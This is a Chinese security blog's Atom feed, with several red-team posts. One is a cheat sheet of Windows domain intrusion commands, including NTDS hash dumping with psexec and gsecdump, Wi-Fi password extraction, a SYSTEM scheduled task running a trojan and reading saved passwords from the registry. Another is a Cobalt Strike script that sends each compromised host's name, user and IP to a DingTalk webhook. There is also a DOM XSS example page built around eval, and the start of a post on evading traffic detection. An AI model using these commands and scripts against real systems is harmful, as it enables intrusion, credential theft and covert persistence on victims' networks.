<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>垃圾箱</title>
  
  <subtitle>tran</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-10-11T08:34:35.881Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Keyi 无尾熊</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网渗透常用命令</title>
    <link href="http://yoursite.com/2021/10/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2021/10/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2021-10-11T08:01:26.792Z</published>
    <updated>2021-10-11T08:34:35.881Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-域常用操作命令"><a href="#1-域常用操作命令" class="headerlink" title="1.域常用操作命令"></a>1.域常用操作命令</h2><table><thead><tr><th align="left"><strong>域常用操作命令</strong></th><th></th></tr></thead><tbody><tr><td align="left">whoami /all</td><td>查看当前域并获取域SID(查看当前用户、权限)</td></tr><tr><td align="left">wmic product get name,version</td><td>查看安转的软件及版本信息</td></tr><tr><td align="left">net localgroup administrators</td><td>查看本地管理员组（通常包含域用户）</td></tr><tr><td align="left">net session</td><td>列出本地计算机与所连接的客户端主机之间的会话</td></tr><tr><td align="left">wmic qfe get Caption,Description,HotFixID,InstalledOn</td><td>查看补丁列表</td></tr><tr><td align="left">net share</td><td>查看本机共享</td></tr><tr><td align="left">wmic share get name,path,status</td><td>查看本机共享</td></tr><tr><td align="left">tasklist / svc</td><td>查看本机进程</td></tr><tr><td align="left">wmic process</td><td>查看本机进程</td></tr><tr><td align="left">wmic process list brief</td><td>查看本机进程</td></tr><tr><td align="left">wmic process get processid,executablepath,name</td><td>显示进程的路径、名称、pid</td></tr><tr><td align="left">wmic service list brief</td><td>查看本机服务</td></tr><tr><td align="left">wmic startuo get command,caption</td><td>查看自启程序列表</td></tr><tr><td align="left">net statistics workstation</td><td>查看主机开机时间</td></tr><tr><td align="left">schtasks /query /fo LIST /v</td><td>查看计划任务</td></tr><tr><td align="left">net config workstation</td><td>判断是否存在域，机器属于哪个域</td></tr><tr><td align="left">net view /domain</td><td>查询有几个域, 查询域列表</td></tr><tr><td align="left">net time</td><td>查看域</td></tr><tr><td align="left">net time /domian</td><td>查询主域服务器的时间</td></tr><tr><td align="left">net group “domain controllers” /domain</td><td>查看域控制器组</td></tr><tr><td align="left">nltest /DCLIST:0day</td><td>查看域控制器主机名，0day为域名</td></tr><tr><td align="left">nltest /domain_trusts</td><td>列出域信任关系</td></tr><tr><td align="left">net group /domain</td><td>查看域内用户组列表</td></tr><tr><td align="left">net group “domain Admin” /domain</td><td>查看域管理员组</td></tr><tr><td align="left">net group “Enterprise Admin” /domain</td><td>查看企业系统管理员组</td></tr><tr><td align="left">net group “Domain Computers” /domain</td><td>查看所有的域成员主机</td></tr><tr><td align="left">net group “Domain Controllers” /domain</td><td>查看域控制器</td></tr><tr><td align="left">net accounts /domain</td><td>获取域密码信息</td></tr><tr><td align="left">net user /domain</td><td>查看域用户信息</td></tr><tr><td align="left">net user xxx /domain</td><td>查看指定域用户详细信息</td></tr><tr><td align="left">wmic useraccount get /all</td><td>获取域内用户详细信息(用户名、描述信息、SID、域名、状态)</td></tr><tr><td align="left">net group qq_group /domain</td><td>显示域中qq_group组的成员</td></tr><tr><td align="left">net view /domain:testdomain</td><td>查看 testdomain域中的计算机列表</td></tr><tr><td align="left">net user domain-admin /domain</td><td>查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</td></tr><tr><td align="left">echo %logonserver%</td><td>查看登陆到这台服务器的计算机名</td></tr><tr><td align="left">net time \\192.168.1.1</td><td>查询远程共享主机192.168.1.1的时间</td></tr><tr><td align="left">net use \\IP\ipc$ password /user:username@domain</td><td>ipc$域内连接</td></tr><tr><td align="left">net view \\dc2.0day.org</td><td>查看域控共享情况</td></tr><tr><td align="left">dir \\dc2.0day.org /s /a &gt; sysvol.txt</td><td>列出sysvol日志记录</td></tr><tr><td align="left">xcopy \\dc2.0day.org\sysvol.txt sysvol.txt /i /e /c</td><td>远程拷贝到本地sysvol日志</td></tr><tr><td align="left">net user /domain bk bk123</td><td>修改域内用户密码，需要管理员权限</td></tr><tr><td align="left">net localgroup administartors  0day\zhangwei /add</td><td>将0day域中的用户zhangwei添加到administrators组中</td></tr><tr><td align="left">mstsc /admin</td><td>远程桌面登录到console会话解决hash无法抓出问题</td></tr><tr><td align="left">gpupdate/force</td><td>更新域策略</td></tr><tr><td align="left">psexec \192.168.1.3 -u administrator -p bk1234 -c gsecdump.exe -u</td><td>从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</td></tr><tr><td align="left">gsecdump -a</td><td>获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</td></tr><tr><td align="left">tasklist /S ip /U domain\username /P /V</td><td>查看远程计算机进程列表</td></tr></tbody></table><h2 id="2-域常用操作命令"><a href="#2-域常用操作命令" class="headerlink" title="2.域常用操作命令"></a>2.域常用操作命令</h2><table><thead><tr><th align="left"><strong>2.基本内网渗透命令：</strong></th><th></th></tr></thead><tbody><tr><td align="left">ipconfig /all</td><td>查看IP地址</td></tr><tr><td align="left">ipconfig /release</td><td>释放地址</td></tr><tr><td align="left">ipconfig /renew</td><td>重新获取Ip地址</td></tr><tr><td align="left">whoami</td><td>查询账号所属权限</td></tr><tr><td align="left">whoami /all</td><td>查看sid值</td></tr><tr><td align="left">systeminfo</td><td>查询系统以及补丁信息</td></tr><tr><td align="left">tasklist /svc</td><td>查看进程</td></tr><tr><td align="left">taskkill /im 进程名称(cmd)</td><td>结束进程</td></tr><tr><td align="left">taskkill /pid</td><td>[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</td></tr><tr><td align="left">wmic qfe get hotfixid</td><td>查看已安装过得补丁，这个很实用</td></tr><tr><td align="left">wmic qfe list full /format:htable &gt; hotfixes.htm</td><td>详细的补丁安装</td></tr><tr><td align="left">wmic qfe</td><td>查询补丁信息以及微软提供的下载地址</td></tr><tr><td align="left">ping hostname(主机名）</td><td>显示该机器名的IP</td></tr><tr><td align="left">net start</td><td>查看当前运行的服务</td></tr><tr><td align="left">net user</td><td>查看本地组的用户</td></tr><tr><td align="left">net localhroup administrators</td><td>查看本机管理员组有哪些用户</td></tr><tr><td align="left">net user</td><td>查看会话</td></tr><tr><td align="left">net session</td><td>查看当前会话</td></tr><tr><td align="left">net share</td><td>查看SMB指向的路径[即共享]</td></tr><tr><td align="left">wmic share get name,path</td><td>查看SMB指向的路径</td></tr><tr><td align="left">wmic nteventlog get path,filename,writeable</td><td>查询系统日志文件存储位置</td></tr><tr><td align="left">net use \\IP\ipc$ password /user:username</td><td>建立IPC会话（工作组模式）</td></tr><tr><td align="left">net use z: \\192.168.1.1</td><td>建立映射到本机Z盘</td></tr><tr><td align="left">net time \\172.16.16.2</td><td>查询共享主机的是</td></tr><tr><td align="left">at \\172.16.16.2 13:50 c:\windows\2009.exe</td><td>在共享主机上执行</td></tr><tr><td align="left">netstat -ano</td><td>查看开放的端口</td></tr><tr><td align="left">netstat -an | find “3389”</td><td>找到3389端口</td></tr><tr><td align="left">net accounts</td><td>查看本地密码策略</td></tr><tr><td align="left">nbtstat –A ip</td><td>netbiso查询</td></tr><tr><td align="left">net view</td><td>查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</td></tr><tr><td align="left">echo %PROCESSOR_ARCHITECTURE%</td><td>查看系统是32还是64位</td></tr><tr><td align="left">set</td><td>查看系统环境设置变量</td></tr><tr><td align="left">net start</td><td>查看当前运行的服务</td></tr><tr><td align="left">wmic service list brief</td><td>查看进程服务</td></tr><tr><td align="left">wmic process list brief</td><td>查看进程</td></tr><tr><td align="left">wmic startup list brief</td><td>查看启动程序信息</td></tr><tr><td align="left">wmic product list brief</td><td>查看安装程序和版本信息（漏洞利用线索）</td></tr><tr><td align="left">wmic startup list full</td><td>识别开机启动的程序</td></tr><tr><td align="left">wmic process where(description=”mysqld.exe”)&gt;&gt;mysql.log</td><td>获取软件安装路径</td></tr><tr><td align="left">for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan showprofiles’) do @echo %j | findstr-i -v echo | netsh wlan show profiles %jkey=clear</td><td>一键获取wifi密码</td></tr><tr><td align="left">if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell)</td><td>查看是否支持posershell</td></tr><tr><td align="left">qwinsta</td><td>查看登录情况</td></tr><tr><td align="left">schtasks.exe /Create /RU”SYSTEM” /SC MINUTE /MO 45 /TN FIREWALL /TR “c:/muma.ex  e” /ED 2017/4/7</td><td>添加计划任务</td></tr><tr><td align="left">REG query HKCU /v “pwd” /s</td><td>获取保存到注册表中的密码</td></tr></tbody></table><h3 id="提权补丁"><a href="#提权补丁" class="headerlink" title="提权补丁"></a>提权补丁</h3><table><thead><tr><th>set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;setKB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;setKB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;setKB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;setKB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i “%i”||@echo %%i% Not Installed!)&amp;del /f/q /a a.txt</th><th>windows未打补丁情况</th></tr></thead></table><h2 id="3-内网网络结常用命令"><a href="#3-内网网络结常用命令" class="headerlink" title="3.内网网络结常用命令"></a>3.内网网络结常用命令</h2><table><thead><tr><th><strong>内网网络结常用命令：</strong></th><th></th></tr></thead><tbody><tr><td>tracert IP</td><td>路由跟踪</td></tr><tr><td>route print</td><td>打印路由表</td></tr><tr><td>arp -a</td><td>列出本网段内所有活跃的IP地址</td></tr><tr><td>arp -s （ip + mac）</td><td>绑定mac与ip地址</td></tr><tr><td>arp -d （ip + mac）</td><td>解绑mac与ip地址</td></tr><tr><td>nbtscan -r 192.168.16.0/24</td><td>通过小工具nbtscan扫描整个网络</td></tr><tr><td>netsh firewall show config</td><td>查看防火墙策略</td></tr><tr><td>netsh firewall show state</td><td>查看防火墙策略</td></tr><tr><td>for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i”ttl”</td><td>批量扫描内网存活主机</td></tr></tbody></table><table><thead><tr><th>windows自带端口转发：</th><th></th></tr></thead><tbody><tr><td>netsh interface ipv6 install</td><td>首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）</td></tr><tr><td>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22connectaddress=1.1.1.1 connectport=22</td><td>将本机22到1.1.1.1的22</td></tr><tr><td>netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=8.8.8.8 connectport=22</td><td></td></tr><tr><td>netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=<a href="http://www.baidu.com">www.baidu.com</a> connectport=22</td><td></td></tr><tr><td>netsh interface portproxy show all</td><td>查看转发配置</td></tr><tr><td>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0listenport=22</td><td>删除配置</td></tr><tr><td>netsh firewall set portopening protocol=tcp port=22 name=Forwardmode=enable scope=all profile=all</td><td>添加防火墙规则，允许连接22：</td></tr></tbody></table><h2 id="4-敏感数据和目录"><a href="#4-敏感数据和目录" class="headerlink" title="4.敏感数据和目录"></a>4.敏感数据和目录</h2><table><thead><tr><th><strong>敏感数据和目录：</strong></th><th></th></tr></thead><tbody><tr><td>dir /b/s config.*</td><td>查看所在目录所有config.为前缀的文件</td></tr><tr><td>findstr /si password *.xml *.ini *.txt</td><td>查看后缀名文件中含有password关键字的文件</td></tr><tr><td>findstr /si login *.xml *.ini *.txt</td><td>查看后缀名文件中含有login关键字的文件</td></tr><tr><td>copy con 创建命令：</td><td></td></tr><tr><td>copy con ftp.bat</td><td>创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</td></tr><tr><td>copy con test.vbs</td><td>创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</td></tr></tbody></table><h2 id="5-dsquery的AD查询工具"><a href="#5-dsquery的AD查询工具" class="headerlink" title="5.dsquery的AD查询工具"></a>5.dsquery的AD查询工具</h2><table><thead><tr><th><strong>dsquery的AD查询工具：</strong></th><th></th></tr></thead><tbody><tr><td>dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</td><td>列出该域内所有用户名</td></tr><tr><td>dsquery server -domain super.com | dsget server -dnsname -site</td><td>搜索域内所有域控制器并显示他们的DNS主机名和站点名称</td></tr><tr><td>dsquery contact</td><td>寻找目录中的联系人</td></tr><tr><td>dsquery subnet</td><td>列出该域内网段划分</td></tr><tr><td>query user</td><td>查询那些用户在线</td></tr><tr><td>dsquery group &amp;&amp; net group /domain</td><td>列出该域内分组</td></tr><tr><td>dsquery ou</td><td>列出该域内组织单位</td></tr><tr><td>dsquery server &amp;&amp; net time /domain</td><td>列出该域内域控制器</td></tr><tr><td>dsquery site -o rdn</td><td>搜索域中所有站点的名称</td></tr><tr><td>dsquery group dc=super,dc=com |more</td><td>搜索在DC=SUPER,DC=COM 域中的所有组</td></tr><tr><td>psloggedon.exe</td><td>查询那台主机和用户登录到该主机上</td></tr><tr><td>netsess.exe  //192.168.1.115</td><td>远程主机上无需管理员权限,查询到主机名和用户</td></tr><tr><td>reg query “HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT”</td><td>获取最近mstsc登录的记录</td></tr></tbody></table><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/243640.html">内网渗透测试：内网信息收集与上传下载</a></p><p><a href="http://www.tiaozhanziwo.com/intranet_penetration/756-2.html">内网渗透命令大全挑战自我博客</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-域常用操作命令&quot;&gt;&lt;a href=&quot;#1-域常用操作命令&quot; class=&quot;headerlink&quot; title=&quot;1.域常用操作命令&quot;&gt;&lt;/a&gt;1.域常用操作命令&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;left&quot;&gt;&lt;strong
      
    
    </summary>
    
    
      <category term="内网" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike上线之钉钉提醒</title>
    <link href="http://yoursite.com/2021/07/29/dingtalk_webhook/"/>
    <id>http://yoursite.com/2021/07/29/dingtalk_webhook/</id>
    <published>2021-07-29T10:46:38.685Z</published>
    <updated>2021-10-11T08:35:39.573Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>平时钓鱼或者在吃饭的时候不能时刻盯着cs，原来一直使用<a href="https://sct.ftqq.com/sendkey">server酱</a>进行cs上线提醒，后续发现他开始收费了，那鱼儿上线后就无法及时进行维权。所以想通过钉钉webhook进行提醒</p></blockquote><p>效果如下：</p><p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/07/30/16275510645002.jpg" alt=""></p><h2 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h2><h3 id="一-新建个人群聊"><a href="#一-新建个人群聊" class="headerlink" title="一.新建个人群聊"></a>一.新建个人群聊</h3><p>这个功能是群通知的功能，我们要建立个人群聊。<br>打开<code>手机版钉钉</code>-&gt;右上角点击<code>发起群聊</code>-&gt;<code>面对面建群</code><br>注意：电脑版的钉钉不可以！</p><h3 id="二-接下来在群聊里新建webhook"><a href="#二-接下来在群聊里新建webhook" class="headerlink" title="二.接下来在群聊里新建webhook"></a>二.接下来在群聊里新建webhook</h3><p><code>点击设置</code>-<code>智能群助手</code>-<code>添加机器人</code>-<code>自定义</code></p><p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/07/30/16275505505637.jpg" alt=""></p><p>接着进行对机器人添加<code>自定义关键词</code>=“CS”</p><p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/07/30/16275506099188.jpg" alt=""></p><h3 id="三-导入dingtalk-webhook-cna-到cs"><a href="#三-导入dingtalk-webhook-cna-到cs" class="headerlink" title="三.导入dingtalk_webhook.cna 到cs"></a>三.导入dingtalk_webhook.cna 到cs</h3><p>下载<a href="https://github.com/fanyibo2009/dingtalk_webhook/releases/download/V1.0/dingtalk_webhook.cna">dingtalk_webhook.cna</a>，修改dingtalk_webhookURL内容为自己的token<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/07/30/16275522427259.jpg" alt=""></p><p>代码如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#author: 无尾熊/keyi</span><br><span class="line"></span><br><span class="line">#set this info:</span><br><span class="line"></span><br><span class="line">$dingtalk_webhookURL = &#x27;https://oapi.dingtalk.com/robot/send?access_token=【webhook的token】&#x27;;</span><br><span class="line"></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"></span><br><span class="line">    println(&quot;Initial Beacon Checkin: &quot; . $1 . &quot; PID: &quot; . beacon_info($1, &quot;pid&quot;));</span><br><span class="line">    local(&#x27;$internalIP $computerName $userName&#x27;);</span><br><span class="line">    $internalIP = replace(beacon_info($1, &quot;internal&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $computerName = replace(beacon_info($1, &quot;computer&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $userName = replace(beacon_info($1, &quot;user&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $message = &#x27;CobaltStrike上线提醒:\n&#x27;.$teamserver_hostname.&#x27;主机名称:&#x27;.$computerName.&#x27;\nUsername : &#x27;.$userName.&#x27;\nIpaddres : &#x27;.$internalIP;</span><br><span class="line"></span><br><span class="line">@curl_command = @(&#x27;curl&#x27;,&#x27;-H&#x27;,&#x27;Content-Type: application/json&#x27;,&#x27;POST&#x27;,&#x27;--data&#x27;,&#x27;&#123;&quot;msgtype&quot;:&quot;text&quot;,&quot;text&quot;:&#123;&quot;content&quot;:&quot;CS&#x27;.$message.&#x27;&quot;&#125;&#125;&#x27;,$dingtalk_webhookURL) ;</span><br><span class="line">exec(@curl_command);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四-持续监控"><a href="#四-持续监控" class="headerlink" title="四.持续监控"></a>四.持续监控</h3><p>电脑断网后beacon上线后钉钉无提醒？<br>原因是：在cs客户端关闭后，加载的插件将无法运行，所以我们需要在cs的服务端去运行插件</p><p>agscript使用方法</p><pre><code>./agscript [host] [port] [user] [pass]   Connect to a team server and start the Aggressor Script console</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1512736">Cobalt Strike beacon上线通知cna脚本</a><br><a href="https://github.com/michalkoczwara/aggressor_scripts_collection/blob/master/slack-notify-beacon.cna">slack-notify-beacon.cna</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;平时钓鱼或者在吃饭的时候不能时刻盯着cs，原来一直使用&lt;a href=&quot;https://sct.ftqq.com/sendkey&quot;&gt;server酱&lt;/a&gt;进行cs上线提醒，后续发现他开始收费了，那鱼儿上线后就无法及时进行维权。所以想通过钉钉webh
      
    
    </summary>
    
    
      <category term="cs脚本" scheme="http://yoursite.com/categories/cs%E8%84%9A%E6%9C%AC/"/>
    
    
      <category term="工具开发" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>DOMXSS的一点研究</title>
    <link href="http://yoursite.com/2021/02/22/DOMXSS/"/>
    <id>http://yoursite.com/2021/02/22/DOMXSS/</id>
    <published>2021-02-22T09:38:43.000Z</published>
    <updated>2021-02-23T03:12:54.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>近期一起与Camaro师傅做项目，发现他对domxss有很深入的研究（前端之父），顺便学习讨论了一下，写点博客记录一下心得。Dom可以简单理解为html的节点，当前端参数可控制、并且可影响节点时候，形成domxss。<br>通常来讲domxss是属于前端的漏洞，通过前端的javascript代码获取传入的变量，形成xss漏洞。特点：不会与后端服务器进行交互。DOM XSS有何不同？我们可以观察到：HTML页面是静态的，并且与其他类型的XSS攻击一样，页面源代码中没有嵌入任何恶意脚本。如果使用＃字符，脚本代码将永远不会到达服务器。它被视为一个片段，浏览器不会转发它。因此，服务器端攻击检测工具将无法检测到此攻击。这里抛出一个疑问：如果一段domxss的payload可以保存在前端，并且储存到数据库中。比如在留言的地方插入domxss-payload，那么当我们点击这个留言的时候触发domxss，我们是否可以称它为存储型domxss呢？是不是颠覆了大家对xss的分类和认知了？–通常domxss被称为“javascript中输出数据到HTML页面”，domxss的分类在我眼里一直是一个谜。</p><h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>domxss漏洞审计三步骤：漏洞的挖掘方式一般是从输入源或者输出点进行审计。通常我们是打开控制台，在console中对可以的关键函数进行输出，查看参数值是否可被控制，打断点进行调试。</p><p>分析domxss的三大步骤：<br>输入源-编码-输出点<br>1.输入源(sources)：<br>location.href<br>lcoation.hash<br>location.search</p><p>三个函数的作用域</p><p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139858968246.jpg" alt="-w773"></p><p>2.编码：<br>js对文字进行编码涉及3个函数：escape,encodeURI,encodeURIComponent，相应3个解码函数：unescape,decodeURI,decodeURIComponent</p><p>3.输出点(sinks)：<br>eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write()<br>.innerHTML、.outerHTML<br>.append 等</p><hr><blockquote><p>输入点：<br>document.location<br>document.URL<br>document.URLUnencoded<br>document.referrer<br>window.location（href hash）<br>所有的inputs<br>window.name<br>document.cookie<br>XMLhttpRequest<br>localstorage</p></blockquote><blockquote><p>输出点：<br>document.write()<br>document.writeln()<br>xxx.innerHTML=<br>xxx.outerHTML=<br>innerHTML.replace=<br>document.attachEvent()<br>window.attachEvent()<br>document.location.replace()<br>document.location.assign()<br>document.domain<br>someDOMElement.insertAdjacentHTML<br>someDOMElement.onevent</p></blockquote><p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities">关键函数列表</a></p><h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><p>将下述代码保存为domxss.html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a href=&quot;?name=1&quot; /&gt;</span><br><span class="line">    name 的值   </span><br><span class="line">    &lt;script&gt;</span><br><span class="line"></span><br><span class="line">    function GetRequest() &#123;</span><br><span class="line">        var url = location.search; //获取url中&quot;?&quot;符后的字串</span><br><span class="line">        var theRequest = new Object();</span><br><span class="line">        if (url.indexOf(&quot;?&quot;) != -1) &#123;</span><br><span class="line">            var str = url.substr(1);</span><br><span class="line">            strs = str.split(&quot;&amp;&quot;);</span><br><span class="line">            for(var i = 0; i &lt; strs.length; i ++) &#123;</span><br><span class="line">                theRequest[strs[i].split(&quot;=&quot;)[0]]=decodeURI(strs[i].split(&quot;=&quot;)[1]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return theRequest;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    //调用</span><br><span class="line">    var Request = new Object();</span><br><span class="line">    Request = GetRequest();</span><br><span class="line">    var name;</span><br><span class="line">    name = Request[&#x27;name&#x27;];</span><br><span class="line">    document.write(eval(name))  </span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>输入domxss.html?name=javascript:alert(1) 成功弹框<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139813417431.jpg" alt="-w902"></p><p>我们对关键代码进行分析：</p><pre><code>var url = location.searchvar name;name = Request[&apos;name&apos;];document.write(eval(name))  </code></pre><p>从浏览器获取name的值，然后重新赋值给新变量name，然后使用eval语句直接输出。eval函数可以直接执行javascript代码，所以我们输入name=javascript:alert(1)成功弹框。在上述代码中，输入源（sources）是location.search，输出点（sinks）是document.write。所以大家在做domxss漏洞挖掘的时候可以重点先关注“关键字”进行审计，如上述说的location.search等。<br>重点关键字表格如下：<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139826344907.jpg" alt="-w1368"><br><a href="https://github.com/fanyibo2009/work/blob/master/dom-xss%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0.xlsx">表格下载</a></p><p>获取节点的主要方法<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139847616990.jpg" alt="-w631"></p><p>关于漏洞修复可以看<a href="https://security.jd.com/#/safetyResearch/219">DOM-XSS漏洞挖掘</a>这部分</p><p>最后大家可以关注一些浏览器特性，还有就是“通过web唤起APP的操作也是越来越多，跳转的协议也是多种多样，例如 webview:// , myappbridge:// 等等。 仅仅使用 http 和 https 来判断URL是否合法已经不适用了，于是由跳转所产生的DOM-XSS漏洞也逐渐增多”</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">DOM-based XSS</a><br><a href="https://security.jd.com/#/safetyResearch/219">DOM-XSS漏洞挖掘</a><br><a href="https://blog.th3wind.xyz/posts/1832779944.html">DOM XSS从javascript中输出数据到HTML页面</a><br><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities">DOM-xss列表</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;起源&quot;&gt;&lt;a href=&quot;#起源&quot; class=&quot;headerlink&quot; title=&quot;起源&quot;&gt;&lt;/a&gt;起源&lt;/h2&gt;&lt;p&gt;近期一起与Camaro师傅做项目，发现他对domxss有很深入的研究（前端之父），顺便学习讨论了一下，写点博客记录一下心得。Dom可以简单理
      
    
    </summary>
    
    
      <category term="xss" scheme="http://yoursite.com/categories/xss/"/>
    
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike绕过流量审计</title>
    <link href="http://yoursite.com/2020/09/23/CobaltStrike/"/>
    <id>http://yoursite.com/2020/09/23/CobaltStrike/</id>
    <published>2020-09-23T13:02:23.000Z</published>
    <updated>2020-09-24T06:45:20.210Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cobalt-Strike-绕过流量审计"><a href="#Cobalt-Strike-绕过流量审计" class="headerlink" title="Cobalt Strike 绕过流量审计"></a>Cobalt Strike 绕过流量审计</h1><h2 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h2><p>Cobalt Strike is software for Adversary Simulations and Red Team Operations.<br>Cobalt Strike 简称CS， <a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">A-team详细介绍使用网址</a>。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。<br><strong>多人运动来不来</strong>？<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007629731936.jpg" alt="-w936"></p><h2 id="去除特征的三种方式"><a href="#去除特征的三种方式" class="headerlink" title="去除特征的三种方式"></a>去除特征的三种方式</h2><h3 id="1-修改默认端口"><a 